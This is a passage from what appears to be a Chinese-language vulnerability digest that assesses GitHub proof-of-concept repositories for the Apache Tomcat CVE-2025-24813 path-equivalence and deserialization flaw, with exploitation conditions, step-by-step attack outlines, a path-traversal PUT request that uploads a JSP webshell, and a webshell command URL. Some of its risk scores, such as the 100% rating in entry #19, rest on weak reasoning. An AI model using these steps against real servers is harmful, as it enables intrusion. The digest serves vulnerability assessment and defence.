**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

